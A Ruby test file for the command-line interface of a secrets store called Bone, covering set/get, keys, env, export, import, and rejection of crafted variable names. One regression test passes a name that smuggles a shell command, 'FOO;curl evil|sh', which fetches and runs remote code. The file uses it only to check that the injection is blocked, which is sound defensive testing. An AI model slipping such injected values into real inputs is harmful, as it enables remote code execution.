# try/60_cli_try.rb
#
# Exercises the Dry::CLI command layer (lib/bone/cli.rb), which previously had
# zero tests (F3). Each subcommand is driven in-process against the memory
# backend. Also locks the CLI-level name-injection defence (F1/F2): a crafted
# variable name must be rejected with exit 1 and never stored.

require 'bone/cli'
require 'stringio'

# Run a CLI invocation in-process. Captures stdout/stderr, stubs stdin, and
# catches the SystemExit raised by abort_with's `exit 1`. Streams are always
# restored in `ensure`. Returns [stdout, stderr, exit_status].
#
# tty: controls $stdin.tty? — the `set`-with-no-value branch reads STDIN only
# when it is NOT a tty, so pass tty: true to exercise the "No value given" path.
def run_cli(*args, stdin: '', tty: false)
  out     = StringIO.new
  err     = StringIO.new
  fake_in = StringIO.new(stdin)
  fake_in.define_singleton_method(:tty?) { tty }

  old_out, old_err, old_in = $stdout, $stderr, $stdin
  $stdout, $stderr, $stdin = out, err, fake_in
  status = 0
  begin
    Dry::CLI.new(Bone::CLI).call(arguments: args)
  rescue SystemExit => e
    status = e.status
  ensure
    $stdout, $stderr, $stdin = old_out, old_err, old_in
  end
  [out.string, err.string, status]
end

# Reset global Bone state and register a known token, since the CLI mutates
# ambient Bone.token/secret/source. Called at the top of each block that needs
# a store, for isolation.
def fresh_bone!
  Bone::Backends::Memory.reset!
  Bone.source = 'memory://localhost'
  Bone.token  = 'cli-token'
  Bone.secret = 'cli-secret'
  Bone.register('cli-token', 'cli-secret')
end

## version prints the version to stdout
run_cli('version').first
#=> "Bone 0.4.0\n"

## generate prints BONE_TOKEN and BONE_SECRET lines
fresh_bone!
out, = run_cli('generate')
[out.include?('BONE_TOKEN='), out.include?('BONE_SECRET=')]
#=> [true, true]

## set stores a value and get reads it back
fresh_bone!
run_cli('set', 'API_KEY', 'sk-123')
run_cli('get', 'API_KEY').first
#=> "sk-123\n"

## set reads the value from STDIN when no value argument is given
fresh_bone!
run_cli('set', 'FROM_STDIN', stdin: 'piped-secret')
run_cli('get', 'FROM_STDIN').first
#=> "piped-secret\n"

## set with no value on a tty aborts with exit 1
fresh_bone!
out, err, status = run_cli('set', 'LONELY', tty: true)
[err.include?('No value given'), status]
#=> [true, 1]

## delete removes a key
fresh_bone!
run_cli('set', 'TMP', 'x')
run_cli('delete', 'TMP')
run_cli('keys').first
#=> "# no keys\n"

## delete is registered under the del and rm aliases
[Bone::CLI.get(['del']).command, Bone::CLI.get(['rm']).command]
#=> [Bone::CLI::Delete, Bone::CLI::Delete]

## keys lists stored names
fresh_bone!
run_cli('set', 'A', '1')
run_cli('set', 'B', '2')
run_cli('keys').first.split("\n").sort
#=> ['A', 'B']

## keys supports a glob filter
fresh_bone!
run_cli('set', 'DB_HOST', 'h')
run_cli('set', 'DB_PORT', '5432')
run_cli('set', 'OTHER', 'x')
run_cli('keys', 'DB_*').first.split("\n").sort
#=> ['DB_HOST', 'DB_PORT']

## keys prints a placeholder when the store is empty
fresh_bone!
run_cli('keys').first
#=> "# no keys\n"

## env prints all variables in dotenv format
fresh_bone!
run_cli('set', 'A', '1')
run_cli('set', 'B', '2')
run_cli('env').first
#=> "A=1\nB=2\n"

## export prints shell-eval-able export lines
fresh_bone!
run_cli('set', 'A', '1')
run_cli('export').first
#=> "export A='1'\n"

## import reads dotenv from STDIN and reports the count to stderr
fresh_bone!
out, err, status = run_cli('import', stdin: "X=1\nY=2\n")
[err.include?('Imported 2 variable(s)'), status]
#=> [true, 0]

## imported variables are actually stored
fresh_bone!
run_cli('import', stdin: "X=1\nY=2\n")
run_cli('keys').first.split("\n").sort
#=> ['X', 'Y']

## --token/--secret/--source options reach Bone
fresh_bone!
run_cli('get', 'anything', '--token', 'plumbed-token', '--secret', 'plumbed-secret', '--source', 'memory://localhost')
[Bone.token, Bone.secret, Bone.source.to_s]
#=> ['plumbed-token', 'plumbed-secret', 'memory://localhost']

# -- F1/F2: CLI name-injection regression lock (critical) -----------------

## CRITICAL: set rejects a shell-injecting name (exit 1, stderr message)
fresh_bone!
out, err, status = run_cli('set', 'FOO;curl evil|sh', 'x')
[err.include?('Invalid variable name'), status]
#=> [true, 1]

## CRITICAL: the injecting name was never stored
fresh_bone!
run_cli('set', 'FOO;curl evil|sh', 'x')
run_cli('keys').first
#=> "# no keys\n"

# -- F1/F2: emit-time backstop at the CLI boundary ------------------------
# The write guard makes a poisoned store impossible via the public API, so we
# inject a bad key straight into the backend to simulate a store poisoned
# before the guard existed, then prove env/export refuse to emit it.

## export refuses to emit a poisoned store (exit 1)
fresh_bone!
Bone::Backends::Memory.instance_variable_get(:@store)['cli-token'][:vars]['BAD;x'] = 'v'
out, err, status = run_cli('export')
[err.include?('Refusing to emit'), status]
#=> [true, 1]

## env refuses to emit a poisoned store (exit 1)
fresh_bone!
Bone::Backends::Memory.instance_variable_get(:@store)['cli-token'][:vars]['BAD;x'] = 'v'
out, err, status = run_cli('env')
[err.include?('Refusing to emit'), status]
#=> [true, 1]
